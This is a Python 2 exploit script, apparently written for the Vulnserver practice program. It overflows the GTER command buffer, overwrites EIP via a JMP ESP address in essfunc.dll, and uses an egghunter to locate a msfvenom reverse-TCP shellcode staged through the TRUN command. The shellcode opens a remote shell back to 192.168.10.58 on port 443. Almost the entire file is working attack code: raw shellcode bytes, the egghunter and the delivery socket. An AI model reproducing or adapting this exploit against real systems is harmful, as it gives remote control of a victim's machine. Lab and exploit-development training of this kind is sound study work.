#!/usr/bin/python
# -*- coding: utf-8 -*-
# VANILLA EIP OVERWRITE #

import socket

#JMP ESP in essfunc.dll
offset = "\xaf\x11\x50\x62"

#JMP back into buffer to execute egghunter
jmpback = "\xeb\xb0\x90\x90"

# search for W00TW00T \x54\x30\x30\x57
egghunter = "\x90" * 10 + "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#Payload size: 351 bytes
shell =  "T00WT00W"
# msfvenom -p windows/shell_reverse_tcp -f python -b "\x00\x0a\x0d" -v shell LHOST=192.168.10.58 LPORT=443
#Payload size: 351 bytes
shell += "\x90\x90\x90\xd9\xcb\xd9\x74\x24\xf4\xbf\x7c\x9f\x27\x3f\x5e\x31"
shell += "\xc9\xb1\x52\x31\x7e\x17\x03\x7e\x17\x83\x92\x63\xc5"
shell += "\xca\x96\x74\x88\x35\x66\x85\xed\xbc\x83\xb4\x2d\xda"
shell += "\xc0\xe7\x9d\xa8\x84\x0b\x55\xfc\x3c\x9f\x1b\x29\x33"
shell += "\x28\x91\x0f\x7a\xa9\x8a\x6c\x1d\x29\xd1\xa0\xfd\x10"
shell += "\x1a\xb5\xfc\x55\x47\x34\xac\x0e\x03\xeb\x40\x3a\x59"
shell += "\x30\xeb\x70\x4f\x30\x08\xc0\x6e\x11\x9f\x5a\x29\xb1"
shell += "\x1e\x8e\x41\xf8\x38\xd3\x6c\xb2\xb3\x27\x1a\x45\x15"
shell += "\x76\xe3\xea\x58\xb6\x16\xf2\x9d\x71\xc9\x81\xd7\x81"
shell += "\x74\x92\x2c\xfb\xa2\x17\xb6\x5b\x20\x8f\x12\x5d\xe5"
shell += "\x56\xd1\x51\x42\x1c\xbd\x75\x55\xf1\xb6\x82\xde\xf4"
shell += "\x18\x03\xa4\xd2\xbc\x4f\x7e\x7a\xe5\x35\xd1\x83\xf5"
shell += "\x95\x8e\x21\x7e\x3b\xda\x5b\xdd\x54\x2f\x56\xdd\xa4"
shell += "\x27\xe1\xae\x96\xe8\x59\x38\x9b\x61\x44\xbf\xdc\x5b"
shell += "\x30\x2f\x23\x64\x41\x66\xe0\x30\x11\x10\xc1\x38\xfa"
shell += "\xe0\xee\xec\xad\xb0\x40\x5f\x0e\x60\x21\x0f\xe6\x6a"
shell += "\xae\x70\x16\x95\x64\x19\xbd\x6c\xef\xe6\xea\x64\xd5"
shell += "\x8e\xe8\x78\x28\xf4\x64\x9e\x40\x1a\x21\x09\xfd\x83"
shell += "\x68\xc1\x9c\x4c\xa7\xac\x9f\xc7\x44\x51\x51\x20\x20"
shell += "\x41\x06\xc0\x7f\x3b\x81\xdf\x55\x53\x4d\x4d\x32\xa3"
shell += "\x18\x6e\xed\xf4\x4d\x40\xe4\x90\x63\xfb\x5e\x86\x79"
shell += "\x9d\x99\x02\xa6\x5e\x27\x8b\x2b\xda\x03\x9b\xf5\xe3"
shell += "\x0f\xcf\xa9\xb5\xd9\xb9\x0f\x6c\xa8\x13\xc6\xc3\x62"
shell += "\xf3\x9f\x2f\xb5\x85\x9f\x65\x43\x69\x11\xd0\x12\x96"
shell += "\x9e\xb4\x92\xef\xc2\x24\x5c\x3a\x47\x54\x17\x66\xee"
shell += "\xfd\xfe\xf3\xb2\x63\x01\x2e\xf0\x9d\x82\xda\x89\x59"
shell += "\x9a\xaf\x8c\x26\x1c\x5c\xfd\x37\xc9\x62\x52\x37\xd8"

firststage = "TRUN ." + "\x90" * 10 + shell + "\x90"* 500

crap = "\x90" * 70 + egghunter + "\x90" * (81 - len(egghunter)) + offset + jmpback + "\x43" * 2243 
#crap = "\x90" * 151 + offset + jmpback + "\x43" * 2245

#print "Egghunter Length " + str(len(egghunter))
buffer = "GTER "
buffer+=crap 

print "[*] Sending evil shenanigans - be patient"
print "[*] Sending " + str(len(buffer)) + " bytes to server"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.10.176', 9999))
s.send(firststage)
s.recv(1024)
s.send(buffer)
s.close()
